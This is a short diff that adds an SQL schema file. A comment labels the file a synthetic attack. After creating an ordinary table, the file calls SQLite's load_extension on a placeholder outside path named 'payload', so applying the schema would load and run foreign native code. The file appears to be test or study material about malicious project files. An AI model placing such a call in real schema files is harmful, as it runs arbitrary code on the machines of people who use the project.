@@ -1,0 +1,3 @@
+-- extension schema shipped with the project (synthetic attack)
+CREATE TABLE IF NOT EXISTS ext (id INTEGER PRIMARY KEY);
+SELECT load_extension('{outside}/payload');
